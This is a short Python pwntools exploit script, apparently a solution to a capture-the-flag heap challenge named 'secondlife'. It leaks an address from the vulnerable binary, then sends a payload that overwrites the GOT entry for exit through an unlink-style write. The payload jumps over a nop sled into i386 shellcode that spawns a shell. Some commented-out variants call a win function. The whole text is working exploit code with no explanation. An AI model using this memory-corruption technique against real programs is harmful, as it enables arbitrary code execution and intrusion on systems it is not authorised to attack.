from pwn import *

DEBUG = False
context(arch='i386', os='linux', log_level='debug')

if DEBUG:
	BINFILE = "./vuln"
else:
	BINFILE = "/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53/vuln"

bin = ELF(BINFILE)

win = bin.sym['win']
exit_got = bin.got['exit']
sh = process(BINFILE)
leak = int(sh.recv().split("\n")[-2])

print("win     : {}".format(hex(win)))
print("exit_got: {}".format(hex(exit_got)))
print("leak    : {}".format(hex(leak)))

payload  = ""
payload += p32(exit_got - 12)
payload += p32(leak + 8)

payload += asm('''
	jmp aaa
	{}
aaa:
	'''.format('nop\n'*11) + shellcraft.i386.linux.sh())


# payload += asm('''
# 	push {}
# 	call [esp]
# '''.format(win))


# payload += asm('''
# 	mov edi, {}
# 	call edi
# '''.format(win))

sh.sendline("A")
sh.sendlineafter('...\n', payload)
sh.interactive()
